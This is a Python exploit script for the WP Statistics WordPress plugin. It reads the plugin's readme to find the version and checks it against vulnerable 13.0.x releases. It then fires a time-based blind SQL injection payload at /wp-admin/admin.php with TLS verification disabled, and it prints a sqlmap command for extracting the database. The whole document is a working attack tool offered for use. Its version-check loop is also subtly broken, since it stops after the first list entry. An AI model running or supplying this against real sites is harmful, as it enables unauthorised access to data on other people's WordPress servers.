import requests
from urllib.parse import urlencode, quote_plus
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import re
def blindsql(url):
	url_endpoint = url + '/wp-admin/admin.php'
	ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36"
	sleep = 15
	payload="ID=1 AND (SELECT * from (select SLEEP(%s))a)"%(sleep)
	url_encode = urlencode({'page':'wps_pages_page', 'type':'1', 'ID':payload}, quote_via=quote_plus)
	print('(+) Trying Payload')
	try:
		requests.get(url_endpoint +'?'+ url_encode, headers={'User-Agent':ua}, timeout=10, verify=False)
		print('(!) Target seem like not vuln!')
		return False
	except requests.ConnectTimeout:
		print('(+) WwoowowoW target maybe vuln ;)')
		print('sqlmap -u \"%s\" --techniqu=T --dbms=\"mysql\" -p \"ID\" -b'%(url_endpoint +'?'+ url_encode))
		return True
def exploit(url):
	curl = url + '/wp-content/plugins/wp-statistics/readme.txt'
	try:
		cver = requests.get(curl, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36'}, timeout=5, verify=False).text
		stable_ver = re.findall('Stable tag\:(.*)', cver)[0].replace(' ', '')
		print("(+) WP-statistical Plugin Version = " + stable_ver)
		vuln = ["13.0.7", "13.0.6", "13.0.5", "13.0.4", "13.0.3", "13.0.1", "13.0"]
		for v in vuln:
			if v in stable_ver:
				print("(+) %s Target is vuln!" %(url.replace('https://', '').replace('http://', '').replace('/','')))
				blindsql(url)
				return True
			else:
				print("(-) %s Target is not vuln!" %(url.replace('https://', '').replace('http://', '').replace('/','')))
				return False
	except:
		print("(-) WP-statistical Unable to detect version.")
		return False
#follow me: tw@lotusdll () now put your author on this script ;)
